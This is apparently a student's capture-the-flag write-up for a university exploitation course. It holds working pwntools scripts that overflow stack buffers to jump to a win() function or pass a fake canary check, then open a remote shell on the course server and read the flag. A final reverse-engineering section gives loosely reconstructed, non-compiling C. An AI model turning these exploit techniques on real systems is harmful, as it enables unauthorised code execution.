# z5214048 war2

jump
===========================
Flag: COMP6447{g3T_R4ADY_2_J4MP}

General overview of problems faced
-------------------------------------
Had to hack the program:
1. IDA: win() function at 0x8048536
2. Try huge input and see what happens: Seg fault
3. Try causing multiple seg faults and gather statistics: The input gets written at the different addresses (ASLR?)
4. Find the point (the minimum length) whereby the seg fault occurs: Too bored to do manually, write a function to do so via Pwntools
5. With local seg fault knowledge, connect remotely and obtain shell via win() (just had to change "process" to "remote")


Script/Command used
------------------
1. Run the script (PY3 + Pwntools from Dev3 branch)
```
#!/usr/bin/python3

from binascii import unhexlify
from pwn import *

PROGRAM_NAME = "jump"
ENCODING = "ascii"
REMOTE = 1
OFFSET = 16


def io_beg():
	return remote('plzpwn.me', 2000)
	#process('./jump')
	
def io_rdy(x):
	return x.recvuntil("Do you remember how function pointers work ?".encode(ENCODING), timeout = 10).decode(ENCODING)

def segfault_wrap(tries = 2):
	firstrun = 1
	last = 0

	for i in range(tries):
		header = str(i+1)+". "
		buf = segfault_inc()
		print(header+"seg fault at "+str(buf))
		if(firstrun): 
			firstrun = 0
			last = buf
		elif(buf != last):
			# bad result
			print(header+"Bad result! Last: "+last)
			return buf
		
			
	return buf
		
		

def segfault_inc(lam_beg = lambda: io_beg(), lam_rdy = lambda x: io_rdy(x), max = 100, bad_magic = "ault", good_magic = "------"):
	soup = ""
	entry = 1
		
	while(entry <= max):
		soup = soup + chr(entry+OFFSET)
		
		io = lam_beg()
		lam_rdy(io)
		io.sendline(soup.encode(ENCODING))
		inbound = io.recvall(timeout=5).decode(ENCODING)
		print(inbound)
		
		# any remote
		if(inbound.find(bad_magic) != -1): # seg found
			return (entry)
		
		if(not(REMOTE)):
			if(io.poll() != 0):
				return entry

		if(REMOTE):
			if(inbound.find(good_magic) == -1):
				return entry
		
		entry = (entry + 1)
		
	return -1

def main():
	stage = 0
	fin = 0
	
	while(fin < 1):
		if(stage == 0):
			seg = segfault_wrap()
			stage = stage + 1
		elif(stage == 1):
			seg = seg # - padd
			io = io_beg()
			io_rdy(io)
			fill = b'\x00'*seg
			payload = p32(0x8048536)
			
			
			print("Fill: "+fill.decode(ENCODING))
			print("Payload: "+str(payload))

			io.send_raw(fill+payload) # win
			io.sendline(b'') # fire!
			
			print(io.recv(200, timeout = 5))
			io.interactive()
			stage = stage + 1
		else:
			print("Weird flex, exiting")
			fin = 1

if __name__ == '__main__':
	main()

```
2. In interactive mode do:
```
ls
cat ./flag
```

blind
===========================

Flag: COMP6447{4R3_U_BL1ND?}

General overview of problems faced
-------------------------------------
Had to hack the program

1. IDA: win	00000000080484D6
2. Try huge input and see what happens: Seg fault
3. Same deal as for "jump": automatically/with the little code changes, find the point of seg fault, fill in the 'boring' part, and thereafter write the win() function address in p32() format
4. [Defy the laws of gravity](https://www.youtube.com/watch?v=HgzGwKwLmgM)

Script/Command used
------------------
1. Run the script (PY3 + Pwntools from Dev3 branch)
```
#!/usr/bin/python3

from binascii import unhexlify
from pwn import *

PROGRAM_NAME = "blind"
ENCODING = "ascii"
REMOTE = 1
OFFSET = 16


def io_beg():
	return 	remote('plzpwn.me', 2001)
	#remote('plzpwn.me', 2000)
	#process('./jump')
	
def io_rdy(x):
	return x.recvuntil("This is almost exactly the same as jump...".encode(ENCODING), timeout = 10).decode(ENCODING)

def segfault_wrap(tries = 1):
	firstrun = 1
	last = 0

	for i in range(tries):
		header = str(i+1)+". "
		buf = segfault_inc()
		print(header+"seg fault at "+str(buf))
		if(firstrun): 
			firstrun = 0
			last = buf
		elif(buf != last):
			# bad result
			print(header+"Bad result! Last: "+last)
			return buf
		
			
	return buf
		
		

def segfault_inc(lam_beg = lambda: io_beg(), lam_rdy = lambda x: io_rdy(x), max = 100, bad_magic = "ault", good_magic = "------"):
	soup = ""
	entry = 1
		
	while(entry <= max):
		soup = soup + chr(entry+OFFSET)
		
		io = lam_beg()
		lam_rdy(io)
		io.sendline(soup.encode(ENCODING))
		inbound = io.recvall(timeout=5).decode(ENCODING)
		print(inbound)
		
		# any remote
		if(inbound.find(bad_magic) != -1): # seg found
			return (entry)
		
		if(not(REMOTE)):
			if(io.poll() != 0):
				return entry
		
		entry = (entry + 1)
		
	return -1

def main():
	stage = 0
	fin = 0
	
	while(fin < 1):
		if(stage == 0):
			if(REMOTE):
				seg = 68
			else:
				seg = segfault_wrap()
				
			stage = stage + 1
		elif(stage == 1):
			seg = seg+4# +4 IN THE ASM
			print("New seg fault val: "+str(seg))
			io = io_beg()
			io_rdy(io)
			fill = b'\x00'*seg
			payload = p32(0x080484D6)  # win export
			
			print("Fill: "+str(fill))
			print("Payload: "+str(payload))

			io.send_raw(fill) 
			io.send_raw(payload) # win
			io.sendline() # fire!
			
			io.interactive()
			stage = stage + 1
		else:
			print("Weird flex, exiting")
			fin = 1

if __name__ == '__main__':
	main()

```
2. In interactive mode do:
```
ls
cat ./flag
```

best security
=============

COMP6447{WH4T_I5_A_C4N4RY?}

General overview of problems faced
-------------------------------------
Had to hack the program
1. Try huge inputs to try for seg fault -> no luck -> Canary/unoverflowable function
2. Try IDA:
2.1. Function is gets() -> Overflowable -> Then must be canary
2.2. Canary indeed. There are functions with 'canary' in their name
2.3. F5 in IDA -> In function check_canary() we have (guessed):
```
int check_canary()
{
  char s; // [esp+3h] [ebp-89h]
  int s1; // [esp+83h] [ebp-9h]

  s1 = 1127424787;
  gets(&s);
  if ( strncmp((const char *)&s1, "1234", 4u) )
    return puts("NAAAAAAAA, sorry m8.");
  puts("AAAAAAAAlright m8, calm down.");
  return system("/bin/sh");
}
```
3. Wow! A couple of things
3.1. const string of "1234" -> Noted
3.2. The hell is "strncmp()"? I wish I did COMP1511 to understand stuff
3.3. [Look up "strncmp()"](http://www.cplusplus.com/reference/cstring/strncmp/). It appears to return 0 iff "both strings are equal".
3.4. Try various random inputs -> it seems that `return puts("NAAAAAAAA, sorry m8.");` gets executed in all cases **unless** strncmp() returns strictly 0
4. To make *strncmp()* return 0 strictly, the problem boils down to making "(const char *)&s1" at bytes "4u" (whatever this means) equal 1234. To do so (blindly), we'll need to write
```
len("1234")*x+(y mod len("1234")), WHERE x>0, y>0 = 
4x+(0 or 1 or 2 or 3)
```
of "1234"

4.1 Because of how processors work internally (and if you've done Game hacking), it is much faster for CPUs to read either even or odd addresses. For x86, it's even addresses (frankly I think it's as such for all >= 16bit processors, but that's another story), so it's safe to assume (I'd say, 95% chance), the equation simplifies to:
```
4x+(0 or 2)
```
5. Wrote a little script to bruteforce x'es. Could do for y's, but since there only are two cases, it's all right
6. Assume y = 0. Try to get shell: SUCCESS
7. Do the same for remote: SUCCESS

Script/Command used
------------------
1. Run the script (PY3 + Pwntools from Dev3 branch)
```
#!/usr/bin/python3

from binascii import unhexlify
from pwn import *

PROGRAM_NAME = "bestsec"
ENCODING = "ascii"
REMOTE = 0
OFFSET = 16


def io_beg():
	return remote('plzpwn.me', 2002)
	#process('./bestsecurity')
	
def io_rdy(x):
	return x.recvuntil("AAAAw, yeah...".encode(ENCODING), timeout = 10).decode(ENCODING)

def main():
	stage = 0
	fin = 0
	
	while(fin < 1):
		if(stage == 0):
			found = 0
			i = 1
			good_magic = "calm down"
			
			while(not(found)):
				io = io_beg()
				io_rdy(io)
				payload = "1234"*i
				io.sendline(payload.encode(ENCODING))
				inbound = io.recvall(timeout=5).decode(ENCODING)
				if(inbound.find(good_magic) != -1):
					print(inbound)
					found = 1
				else:
					i = i+1
					
				print("[i: "+ str(i)+"][found: "+str(found)+"]")
				
			stage = stage + 1
		
		if(stage == 1):
			io = io_beg()
			io_rdy(io)
			payload = "1234"*i
			
			io.sendline(payload.encode(ENCODING))
			
			io.interactive()

		else:
			print("Weird flex, exiting")
			fin = 1

if __name__ == '__main__':
	main()
```
2. In interactive mode do:
```
ls
cat ./flag
```

Reverse engineering challenge 
================================
My C is odd (I learnt BCC C, not GCC C), so apologies if things are slightly off the UNSW standards

The code appears to represent canary?

```C

#define CHECK 1337;
#define var_C = -12;
#define envp = 16;

int main(int argc, char *argv[])
{
    // at this point,
    // argc = 8
    
    // first, initialise program specific bits & pieces,
    // more info at https://stackoverflow.com/a/6680177
    int buf_ebx = 7027
    
    // not too sure
    
    int buf_esp = -8;
    int buf_eax = var_C+(and(buf_esp, 0xFFFFFFF0h);
    //...
    int buf;
    
    scanf(&buf);
    int comparison = (buf - CHECK);
    if(comparison == 0)
    {   
        puts("Your so leet!");
    }
    else
    {
        puts("Bye");
    }
    return(1);
}

```
